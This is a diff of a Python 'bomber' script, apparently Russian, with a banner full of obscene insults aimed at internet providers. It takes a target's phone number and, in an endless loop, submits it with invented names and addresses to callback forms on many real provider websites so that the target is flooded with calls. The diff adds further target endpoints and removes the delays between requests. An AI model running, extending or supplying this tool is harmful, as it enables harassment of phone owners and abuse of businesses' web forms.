@@ -1,12 +1,7 @@
 import requests
-import time
 import random
-import os
-import colorama
-from colorama import init, Fore, Back
+from colorama import init, Fore
 init()
-
-os.system('clear')
 
 n0 = ('Евгений', 'Елена', 'Екатерина', 'Наталья', 'Светлана' 'Олег' 'Егор', 'Дмитрий')
 nnf0 = ('Евгений Петрович', 'Евгений Алексеевич', 'Александра Эдуардовна', 'Наталья Андреевна', 'Дмитрий Олегович')
@@ -30,25 +25,27 @@ ckb = random.choice(ckb0)
 city = ('Курск')
 
 hello = """
+***************************************************************************
+
    \|!         Б0мб3р Сп3циальн0г0 Назнач3ния                     
-    !|\                      Имени Авроры                      
-     \|!                                 04.2023        v-1.0      
+    !|\            KAbAH4iK000                      
+     \|!                                 05.2023        v-1.1      
       !|\   by Клуб НеЛюбителей Фикусов                              """
 banner = """
  ____________________________________________________
-|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|             +7                                           
-|ELECOM, СВОЛОЧЬ S,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         .   (9                                 
-|MTS,ROSTELECOM,DOM.RU,MTS,RO ПИДР OM,DOM.RU,MTS,ROST|         0123456789
-|ELECOM, ПАСКУДА S,R блядота ,DOM.RU,MTS,ROSTELECOM,D|         0123456789)
+|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|             +7
+|ELECOM, СВОЛОЧЬ S,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         .   (9
+|MTS,ROSTELECOM,DOM.RU,MTS,RO ШАКАЛ M,DOM.RU,MTS,ROST|         0123456789
+|ELECOM, ПАСКУДА S,R ------- ,DOM.RU,MTS,ROSTELECOM,D|         0123456789)
 |MTS,ROSTELECOM,DOM. AURORA OSTELECOM,DOM.RU,M И ROST|            |    |
 |ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTE Ш OM,D|         0123456789
 |MTS,ROSTE?                              .RU,M А ROST|         0123456789
-|ELECOM,DO!         для химички          'OSTE К OM,D|         0123456789
-|MTS,ROSTE                               .RU,MTS,ROST|           | -|
+|ELECOM,DO! выполняет функции инквизиции 'OSTE К OM,D|         0123456789
+|MTS,ROSTE                 (ну почти)    .RU,MTS,ROST|           | -|
 |ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         0123456789
 |MTS, ТВАРЪ COM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789
 |ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|             -  |
-|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789  
+|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789
 |____________________________________________________|         0123456789
                                                                     '"""
 print(Fore.LIGHTYELLOW_EX + hello)
@@ -71,13 +68,76 @@ try:
     phn0 = phn[1:10]
     phn1 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8}{p9}{p10}'
     phn2 = f'+{p0}({p1}{p2}{p3})-{p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
-    phn3 = f'+({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
     phn4 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
     phn5 = f'8 ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
     phn6 = f'+{p0}({p1}{p2}{p3}){p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
     print('')
 
     while True:
+        try:
+            r = requests.post('https://rem-bt-pro.online/addorders.xphp?idp=de8430e8-a41b-cc0b-a7d61dbc51c5c29b', data={'phone': phn4}, headers={})
+            print(Fore.CYAN + """https://rem-bt-pro.online
+            Заявка отправлена...""")
+            if r.status_code == 200:
+                print(Fore.GREEN + """Успешно
+                                                            """)
+            elif r.status_code == 400:
+                print(Fore.RED + """Безуспешно
+                                                        """)
+            else:
+                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
+                                                         """)
+        except:
+            print(Fore.RED + """Сервис не отвечает
+                                            """)
+        try:
+            r = requests.post('https://kursk.gigaboom.ru/crm/send/modal-callback/', data={'call_time': 'Как можно скорее',
+                                                                                          'customer_text': None,
+                                                                                          'name': n,
+                                                                                          'phone': phn4,
+                                                                                          'provider_name': None}, headers={})
+            print(Fore.CYAN + """https://kursk.gigaboom.ru
+            Заявка отправлена...""")
+            if r.status_code == 200:
+                print(Fore.GREEN + """Успешно
+                                                    """)
+            elif r.status_code == 400:
+             print(Fore.RED + """Безуспешно
+                                                """)
+            else:
+                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
+                                                 """)
+        except:
+            print(Fore.RED + """Сервис не отвечает
+                                        """)
+        try:
+            r = requests.post('https://forms.tildacdn.com/procces/', data={'formservices[]': 'fb4f2fd9f03ea82aed610f3e0692f721',
+                                                                           'formservices[]': 'c03a2f8e392310204430ec3531407011',
+                                                                           'Phone': phn,
+                                                                           'form-spec-comments': None,
+                                                                           'tildaspec-cookie': None,
+                                                                           'tildaspec-referer': 'https://www.montagvsem.ru/#contacts',
+                                                                           'tildaspec-formid': 'form502661400',
+                                                                           'tildaspec-formskey': 'e914884bdc7c850291ec170bf31d9eec',
+                                                                           'tildaspec-version-lib': ' 02.001',
+                                                                           'tildaspec-pageid': '13107907',
+                                                                           'tildaspec-projectid': '2823067',
+                                                                           'tildaspec-lang': 'RU',
+                                                                           'tildaspec-fp': 'st14157w773h790ft60814157'}, headers={})
+            print(Fore.CYAN + """https://forms.tildacdn.com
+            Заявка отправлена...""")
+            if r.status_code == 200:
+                print(Fore.GREEN + """Успешно
+                                        """)
+            elif r.status_code == 400:
+                print(Fore.RED + """Безуспешно
+                                       """)
+            else:
+                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
+                                     """)
+        except:
+            print(Fore.RED + """Сервис не отвечает
+                                """)
         try:
             r = requests.post('https://kursk.mtsru.ru/connect', data={'submitted': '10264',
                                                                               'isPopup10264': '0',
@@ -93,7 +153,7 @@ try:
             print(Fore.CYAN + """https://kursk.mtsru.ru
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
+                print(Fore.GREEN + """Успешно
                                 """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -101,7 +161,6 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                              """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                         """)
@@ -112,7 +171,7 @@ try:
             print(Fore.CYAN + """https://https://kursk.domconnect.ru
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~2 минуты
+                print(Fore.GREEN + """Успешно
                                         """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -120,11 +179,9 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                      """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                                 """)
-            time.sleep(2)
         try:
             r = requests.post('https://kursk-rt.ru/wp-admin/admin-ajax.php', data={'action': 'send_form_this_modal',
                                                                                    'resurs[name]': nff,
@@ -135,7 +192,7 @@ try:
             print(Fore.CYAN + """https://kursk-rt.ru
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~30 минут
+                print(Fore.GREEN + """Успешно
                                     """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -143,11 +200,9 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                  """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                             """)
-        time.sleep(2)
         try:
             r = requests.post('https://kursk.telekom-internet.ru/wp-admin/admin-ajax.php', data={'art_name': nf,
                                                                                                  'art_tel': phn,
@@ -162,7 +217,7 @@ try:
             print(Fore.CYAN + """https://kursk.telekom-internet.ru
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
+                print(Fore.GREEN + """Успешно
                                         """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -170,11 +225,9 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                      """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                                 """)
-            time.sleep(2)
         try:
             r = requests.post('https://kursk.tvoi-provider.ru/actions/formResponse.php', data={'f50name': nf,
                                                                                                'f50phone': phn6,
@@ -183,7 +236,7 @@ try:
             print(Fore.CYAN + """https://kursk.tvoi-provider.ru:
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
+                print(Fore.GREEN + """Успешно
                                         """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -191,18 +244,16 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                      """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                                 """)
-            time.sleep(2)
         try:
             r = requests.post('https://internet.gde-luchshe.ru/api/v1/calls/new/', data={'call[phone]': phn4,
                                                                                          'provider_alias': 'ertelecom'}, headers={})
             print(Fore.CYAN + """https://internet.gde-luchshe.ru:
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~10 минут
+                print(Fore.GREEN + """Успешно
                                     """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -210,36 +261,9 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                  """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                             """)
-            time.sleep(2)
-        try:
-            r = requests.post('https://domru-pro.ru/api/create_order', data={'call_later': 'now',
-                                                                         'call_later_time': None,
-                                                                         'from_site': 'domru-pro.ru',
-                                                                         'name': n,
-                                                                         'phone': phn,
-                                                                         'provider_id': '8',
-                                                                         'slug': 'kursk',
-                                                                         type: 'apartments'}, headers={})
-            print(Fore.CYAN + """https://domru-pro.ru
-            Заявка отправлена...""")
-            if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
-                                        """)
-            elif r.status_code == 400:
-                print(Fore.RED + """Безуспешно
-                                    """)
-            else:
-                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
-                                     """)
-            time.sleep(2)
-        except:
-            print(Fore.RED + """Сервис не отвечает
-                                """)
-            time.sleep(2)
         try:
             r = requests.post('https://kursk.internetv-dom.ru/connect', data={'submitted': '16792',
                                                                               'isPopup16792': '0',
@@ -257,7 +281,7 @@ try:
             print(Fore.CYAN + """https://kursk.internetv-dom.ru
             Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
+                print(Fore.GREEN + """Успешно
                                         """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -265,33 +289,26 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                      """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                                 """)
-            time.sleep(2)
         try:
-            r = requests.post('https://xn--d1aqf.ru.com/wp-json/contact-form-7/v1/contact-forms/32/feedback', data={'_wpcf7': '32',
-                                                                                                                    '_wpcf7_version': '5.2.1',
-                                                                                                                    '_wpcf7_locale': 'ru_RU',
-                                                                                                                    '_wpcf7_unit_tag': 'wpcf7-f32-o1',
-                                                                                                                    '_wpcf7_container_post': '0',
-                                                                                                                    '_wpcf7_posted_data_hash': None,
-                                                                                                                    'text-650': nff,
-                                                                                                                    'tel-239': phn,
-                                                                                                                    'text-651': city,
-                                                                                                                    'text-652': st,
-                                                                                                                    'text-653': d,
-                                                                                                                    'text-654': None,
-                                                                                                                    'сheckbox-251[]': ckb,
-                                                                                                                    'utm_source': None,
-                                                                                                                    'utm_campaign': 'null',
-                                                                                                                    'utm_term': 'null',
-                                                                                                                    'pum_form_popup_id': '33'}, headers={})
-            print(Fore.CYAN + """https://dom.ru.com/kursk/
-            Запрос отправлен...""")
+            r = requests.post('https://ks.wifire.ru/form/mail-sender', data={'form_name': 'express_form_ccmp_short',
+                                                                           'city': f'Wifire {city}',
+                                                                           'clientName': n,
+                                                                           'clientPhone': phn6,
+                                                                           'clientAddress': None,
+                                                                           'house_guid': None,
+                                                                           'clientSite': ' ks.wifire.ru/nadolgo',
+                                                                           'calltracking_params': None,
+                                                                           'tariffId': '4276',
+                                                                           'tariffName': '#ДляДома Турбо',
+                                                                           'comment': '#ДляДома Турбо'}, headers={})
+
+            print(Fore.CYAN + """https://ks.wifire.ru
+            Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
+                print(Fore.GREEN + """Успешно
                                         """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
@@ -299,45 +316,55 @@ try:
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                      """)
-            time.sleep(2)
         except:
             print(Fore.RED + """Сервис не отвечает
                                 """)
-            time.sleep(2)
         try:
-            r = requests.post('https://forms.tildacdn.com/procces/', data={'formservices[]': '9a7583bc193844d71a85e8533523eb83',
-                                                                           'formservices[]': 'e37532ffacd80e7c8323473047845c15',
-                                                                           'tildaspec-formname': 'zayavka1screen',
-                                                                           'usluga': 'Интернет+ТВ',
-                                                                           'tildaspec-phone-part[]-iso': '+7',
-                                                                           'tildaspec-phone-part[]': phn3,
-                                                                           'phone': phn4,
-                                                                           'adres': 'г Москва',
-                                                                           'form-spec-comments': '_ga=GA1.2.481003255.1680794607; _ym_uid=1680794607982802238; _ym_d=1680794607; _gid=GA1.2.1171597313.1680946522; _gat=1; _ym_isad=2',
-                                                                           'tildaspec-referer': 'https://tarify-dom.ru/kursk',
-                                                                           'tildaspec-formid': 'form235754624',
-                                                                           'tildaspec-': '93d84e0c2ba5f1ea33c120ac9d32a',
-                                                                           'formskey': '27a',
-                                                                           'tildaspec-version-lib': '02.001',
-                                                                           'tildaspec-pageid': '14282519',
-                                                                           'tildaspec-projectid': '3060395',
-                                                                           'tildaspec-lang': 'RU',
-                                                                           'tildaspec-fp': 'st445w836h790ft219.171875445'}, headers={})
-            print(Fore.CYAN + """https://tarify-dom.ru
-            Запрос отправлен...""")
+            r = requests.post('https://kursk-wifire.ru/ajax/saveorder.php', data={'fio': nff,
+                                                                                  'phone': phn,
+                                                                                  'address': f'г.{city}, ул.{st}, д.{d}',
+                                                                                  'tarif_id': '0',
+                                                                                  'refmodal': 'returncall-banner',
+                                                                                  'connect_type': '1',
+                                                                                  'wifi': '0',
+                                                                                  'buy_router': '0',
+                                                                                  'tvmodul': '0',
+                                                                                  'buy_tvmodul': '0'}, headers={})
+            print(Fore.CYAN + """https://kursk-wifire.ru
+            Заявка отправлена...""")
             if r.status_code == 200:
-                print(Fore.GREEN + """Успешно, ~15 минут
-                                        """)
+                print(Fore.GREEN + """Успешно
+                                                """)
             elif r.status_code == 400:
                 print(Fore.RED + """Безуспешно
-                                    """)
+                                                """)
             else:
                 print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
-                                     """)
-            time.sleep(2)
+                                                """)
         except:
             print(Fore.RED + """Сервис не отвечает
-                                """)
-            time.sleep(2)
+                                            """)
+        try:
+            r = requests.post('https://www.wifire.ru/form/mail-sender', data={'city': 'Москва',
+                                                                              'cityName': 'Москва',
+                                                                              'form_name': 'express_form_msk',
+                                                                              'comment': 'Заявка со страницы WF www.wifire.ru/, с города Москва',
+                                                                              'clientName': n,
+                                                                              'clientPhone': f'+{p0}({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}{p9}{p10}'}, headers={})
+            print(Fore.CYAN + """https://www.wifire.ru
+            Заявка отправлена...""")
+            if r.status_code == 200:
+                print(Fore.GREEN + """Успешно
+                                                """)
+            elif r.status_code == 400:
+                print(Fore.RED + """Безуспешно
+                                                """)
+            else:
+                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
+                                                """)
+        except:
+            print(Fore.RED + """Сервис не отвечает
+                                            """)
+        print(Fore.LIGHTYELLOW_EX + 'Цикл завершен')
 except:
     print(Fore.RED + 'Неправильно набран номер')
